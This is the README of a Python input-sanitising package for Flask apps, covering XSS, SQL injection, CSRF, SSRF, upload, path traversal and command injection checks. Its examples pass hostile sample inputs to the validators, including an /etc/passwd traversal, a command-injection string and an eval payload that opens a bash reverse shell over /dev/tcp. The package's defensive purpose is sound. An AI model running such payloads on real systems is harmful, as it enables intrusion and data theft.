# Sanitizy
This is a simple and very light weight python package to help securing python web applications in general especially Flask apps since they lack security !!

# Usage:

<h3> XSS:</h3>
<h4> Escape some value:</h4>
<div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">from sanitizy import *
<br>XSS.escape('&lt;h1&gt;')# produces: '&#x26;lt;h1&#x26;gt;'  </pre></div>
<h4> Escape all Flask's paramaters GET:</h4>
<div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">XSS.escape_args(request)#produces a dict with escaped values  </pre></div>
<h4> Escape all Flask's paramaters POST:</h4>
<div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">XSS.escape_form(request)#produces a dict with escaped values </pre></div>

<h3> SQL-Injection:</h3>
<h4> Escape some value:</h4>
<div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">from sanitizy import *
<br>SQLI.escape("' or 1=1 or '")# produces: "\' or 1=1 or \'"  </pre></div>
<h4> Escape all Flask's paramaters GET:</h4>
<div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">SQLI.escape_args(request)#produces a dict with escaped values </pre></div>
<h4> Escape all Flask's paramaters POST:</h4>
<div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">SQLI.escape_form(request)#produces a dict with escaped values </pre></div>

<h3> CSRF:</h3>
<h4> Check if the request is coming from the application itself or not:</h4>
<div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">CSRF.validate("http://www.google.com",["www.google.com","www.bing.com"])#takes the referer header value and a list of allowed domains, then returns 'True' if it's safe and 'False' if not  </pre></div>

<h4> Check if the request is coming from the Falsk application itself or not:</h4>
<div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">CSRF.validate_flask(request)#returns 'True' if it's safe and 'False' if not  </pre></div>

<h3> SSRF:</h3>
<h4> Validate if the url can lead to a SSRF:</h4>
<div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">SSRF.validate("http://localhost:22")#returns 'True' if it's safe and 'False' if not  </pre></div>
<h4> Validate if the Domain/IP can lead to a SSRF:</h4>
<div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">SSRF.validate("localhost:22",url=False)#returns 'True' if it's safe and 'False' if not  </pre></div>


<h3> File Upload:</h3>
<h4> Check if the file is safe or not:</h4>
<div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">FILE_UPLOAD.check_file(request.files['file'],allowed_extensions=['png','jpg','jpeg','gif','pdf'],allowed_mimetypes=["application/pdf","application/x-pdf","image/png","image/jpg","image/jpeg"])#returns 'True' if it's safe and 'False' if not  </pre></div>
<h4> Save files securely:</h4>
<div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">FILE_UPLOAD.save_file(request.files['file'],path="uploads/")#it will returns the path to the uploaded file</pre></div>

<h3> Path Traversal:</h3>
<h4> Check if the file is safe to open/download or not:</h4>
<div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">PATH_TRAVERSAL.check("../../../../../../etc/passwd")#returns 'True' if it's safe and 'False' if not  </pre></div>

<h3> RCE (Remote Code/Command Execution):</h3>
<h4> Check value is safe to pass to a command or not:</h4>
<div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">RCE.command("ls -a ;cat /etc/passwd ")#returns 'True' if it's safe and 'False' if not  </pre></div>
<h4> Check value is safe to pass to an "eval" function or not:</h4>
<div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">RCE.eval("__import__('os').system('bash -i >& /dev/tcp/10.0.0.1/8080 0>&1")#returns 'True' if it's safe and 'False' if not  </pre></div>

<h3> Validate User Inputs:</h3>
<h4> Check value contains alphabets only:</h4>
<div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">FORM_INPUTS.alphabet("ala bouali",length=(1,50))#returns 'True' if it's correct and 'False' if not  </pre></div>

<h4> Check if value contains numbers only:</h4>
<div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">FORM_INPUTS.numeric("233 21 4",length=(1,15))#returns 'True' if it's correct and 'False' if not  </pre></div>

<h4> Check if value contains alphabets only:</h4>
<div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">FORM_INPUTS.alphabet("ala bouali",length=(1,50))#returns 'True' if it's correct and 'False' if not  </pre></div>

<h4> Check if value is alphanumeric:</h4>
<div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">FORM_INPUTS.alphanumeric(" ala bOuali12 56",length=(1,50))#returns 'True' if it's correct and 'False' if not  </pre></div>

<h4> Check if value is an Email:</h4>
<div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">FORM_INPUTS.email("alabouali@gmail.com",length=(6,15))#returns 'True' if it's correct and 'False' if not  </pre></div>

<h4> Check if value is a Phone Number:</h4>
<div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">FORM_INPUTS.phone_number("+123456789",length=(6,15))#returns 'True' if it's correct and 'False' if not  </pre></div>

<h4> Check if value is a long enough Password:</h4>
<div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">FORM_INPUTS.password("fvccabah$vhj",length=(8,15))#returns 'True' if it's correct and 'False' if not  </pre></div>

<h4> Check if 2 Passwords match and if they are long enough:</h4>
<div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">FORM_INPUTS.passwords_match("fvccabah$vhj","fvccabah$234",length=(8,15))#returns 'True' if it's correct and 'False' if not  </pre></div>

<h4> Check if value matches a specific Regex:</h4>
<div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">FORM_INPUTS.regex_match("alabouali@gmail.com",r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',length=(6,15))#returns 'True' if it's correct and 'False' if not  </pre></div>
